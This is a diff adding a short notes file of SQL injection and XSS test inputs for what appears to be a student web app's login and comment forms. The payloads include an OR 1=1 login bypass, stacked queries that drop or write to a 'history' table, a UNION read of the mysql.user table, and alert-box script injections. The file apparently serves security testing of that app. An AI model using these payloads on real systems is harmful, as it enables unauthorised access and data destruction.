@@ -1,0 +1,21 @@
+SQL Injection:
+	username: ' OR 1=1 #
+	password: bilo sta
+
+	username: ' OR 1=1 /*
+	password: */; DROP TABLE history; #
+
+	username: ' OR 1=1 /*
+	password: */; INSERT INTO history (description) values ('you have been hacked :)'); #
+
+	username: ' UNION SELECT Host, User, 1, 2, 3, 4, 5 FROM mysql.`user` u #
+	password: bilo sta
+XSS:
+	username: admin
+	password: admin
+	komentar: <script>alert('You have been hacked')</script>
+
+	username: admin
+	password: admin
+	komentar: " onfocus="alert('Dugme')"
+
